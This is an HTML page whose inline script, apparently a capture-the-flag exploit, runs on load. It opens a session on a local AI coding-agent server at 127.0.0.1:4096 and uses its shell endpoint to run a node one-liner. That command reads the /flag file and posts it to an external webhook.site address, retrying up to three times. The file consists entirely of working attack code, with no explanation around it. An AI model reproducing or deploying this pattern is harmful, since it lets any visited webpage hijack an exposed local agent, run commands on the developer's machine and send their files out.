<!doctype html>
<meta charset="utf-8">
<title>oc</title>
<script>
const BASE = "http://127.0.0.1:4096";
const WEBHOOK = "https://webhook.site/6c7b9fec-12ce-4d1c-b5ce-5938576168f4";

const CMD =
  `node -e 'const fs=require("fs"),https=require("https");` +
  `try{fs.chmodSync("/flag",0o644)}catch{}` +
  `const d=fs.readFileSync("/flag");` +
  `const u=new URL("${WEBHOOK}");` +
  `const r=https.request({hostname:u.hostname,port:u.port||443,path:u.pathname+u.search,method:"POST",headers:{"Content-Type":"text/plain","Content-Length":d.length}},x=>x.resume());` +
  `r.on("error",()=>{});` +
  `r.end(d)'`;

async function pwn() {
  const s = await fetch(`${BASE}/session`, {
    method: "POST",
    headers: { "Content-Type": "application/json" },
    body: "{}",
    credentials: "omit",
  }).then(r => r.json());

  await fetch(`${BASE}/session/${encodeURIComponent(s.id)}/shell`, {
    method: "POST",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify({
      agent: "build",
      command: CMD,
    }),
    credentials: "omit",
  });
}

(async () => {
  for (let i = 0; i < 3; i++) {
    try {
      await pwn();
      break;
    } catch (_) {
      await new Promise(r => setTimeout(r, 800));
    }
  }
})();
</script>
